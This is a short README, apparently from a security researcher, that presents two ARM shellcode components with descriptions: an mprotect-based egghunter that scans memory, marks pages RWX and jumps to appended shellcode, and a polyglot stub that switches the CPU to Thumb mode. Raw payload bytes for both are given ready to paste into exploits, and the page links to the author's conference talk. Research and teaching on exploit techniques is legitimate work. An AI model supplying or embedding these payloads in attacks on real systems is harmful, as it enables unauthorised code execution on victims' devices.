ARM Shellcode
=============

## 1. mprotect egghunter ##

- Searches for an EGG (4+4 byte value) in the memory of the exploited process.
- Uses mprotect() to test the presence of pages in the virtual memory space of the target process.
- mprotect() also marks pages RWX as it scans the virtual memory space.
- Upon finding the pre-defined EGG occuring at consecutive locations, the mprotect egghunter passes on the execution control to the shellcode appended to the eggs.

RAW SHELLCODE:
```
$mprotect_egghunter = "\x01\x10\x8f\xe2\x11\xff\x2f\xe1\x6d\x40\x7d\x27\x01\x21\x09\x03\x07\x22\x28\x1c\x01\xdf\x0c\x30\x01\xd1\x6d\x18\xf9\xe7\x6e\x18\x05\x48\x2b\x68\x04\x35\xb5\x42\xf3\xd0\x2c\x68\x98\x42\xf8\xd1\xa3\x42\xf6\xd1\x04\x35\x28\x47HACK";
```

## 2. Quantum Leap code ##

- ARM/Thumb Polyglot code.
- Can be started in ARM mode or Thumb mode.
- Irrespective of the mode it is started in, the Quantum Leap code will switch the CPU to Thumb mode and proceed to execute any Thumb shellcode appended to it.

RAW SHELLCODE:
```
$quantum_leap_stub = "\x19\xa0\x8f\x22\x15\xa0\x8f\x32\x0d\x40\xa0\x21\x0d\x40\xa0\x31\x12\x04\x2d\x29\x12\x04\x2d\x39\x02\xa0\xbd\x28\x02\xa0\xbd\x38";
```

For more details please browse through my presentation titled "Make ARM Shellcode Great Again" at https://www.slideshare.net/saumilshah/make-arm-shellcode-great-again

@therealsaumil

